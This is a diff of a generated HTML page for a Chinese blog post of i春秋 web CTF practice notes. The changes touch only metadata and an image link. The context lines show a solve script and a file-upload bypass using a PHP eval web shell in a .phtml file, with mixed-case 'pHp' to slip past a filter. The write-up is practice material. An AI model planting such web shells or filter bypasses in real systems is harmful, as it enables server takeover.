@@ -28,6 +28,7 @@
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/4.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/5.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/6.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/7.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/8.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/9.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/10.png">
@@ -36,7 +37,7 @@
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/13.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/14.png">
 <meta property="article:published_time" content="2021-03-28T14:05:07.000Z">
-<meta property="article:modified_time" content="2021-03-28T17:30:17.818Z">
+<meta property="article:modified_time" content="2021-03-28T17:35:24.065Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.tu3k.cn/images/ichunqiu_ctf/1.png">
@@ -336,7 +337,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?value[]&#x3D;d&amp;?value[]&#x3D;j</span><br></pre></td></tr></table></figure>
 <p>等到nums=10，输出flag<br>写个小jio本跑跑</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;640630f2174f46a596bacc4a25cb489d041e1743f2b749bf.changame.ichunqiu.com&#x2F;?value[]&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">payload &#x3D; &#39;ea&#39;</span><br><span class="line">r &#x3D; s.get(url+payload)</span><br><span class="line"></span><br><span class="line">i &#x3D; 0</span><br><span class="line">for i in range(10):</span><br><span class="line">    payload &#x3D; r.text[0:2]</span><br><span class="line">    r &#x3D; s.get(url+payload)</span><br><span class="line">    if &#39;flag&#123;&#39; in r.text:</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>
-<p>在开头 s = requests.session()里面一定要保证，这次payload传输是在一次会话进行的，通过对s进行get操作，就可以保证每次都是在s这个session中完成的<br>![ctf](<a href="https://www.tu3k.cn/images/ichunqiu_ctf/7">https://www.tu3k.cn/images/ichunqiu_ctf/7</a> .png “ctf”)</p>
+<p>在开头 s = requests.session()里面一定要保证，这次payload传输是在一次会话进行的，通过对s进行get操作，就可以保证每次都是在s这个session中完成的<br><img src="https://www.tu3k.cn/images/ichunqiu_ctf/7.png" alt="ctf" title="ctf"></p>
 <h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>可以传任意脚本，但检测了文件内容<code>&lt;?php</code> 会自动剔除<br><img src="https://www.tu3k.cn/images/ichunqiu_ctf/8.png" alt="ctf" title="ctf"><br>可以使用js代码指向php格式来传 1.phtml</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[1])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 <p>连接发现php被剔除了，使用大写绕过,pHp<br><img src="https://www.tu3k.cn/images/ichunqiu_ctf/9.png" alt="ctf" title="ctf"><br>成功获取flag<br><img src="https://www.tu3k.cn/images/ichunqiu_ctf/10.png" alt="ctf" title="ctf"></p>
@@ -362,7 +363,7 @@
         <p><span>Title:</span><a href="/2021/03/28/ichunqiu-ctf-web/">i春秋_WEB_CTF_刷题笔记</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
         <p><span>Created:</span>2021-03-28, 22:05:07</p>
-        <p><span>Updated:</span>2021-03-29, 01:30:17</p>
+        <p><span>Updated:</span>2021-03-29, 01:35:24</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2021/03/28/ichunqiu-ctf-web/" title="i春秋_WEB_CTF_刷题笔记">https://www.tu3k.cn/2021/03/28/ichunqiu-ctf-web/</a>
             <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/28/ichunqiu-ctf-web/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
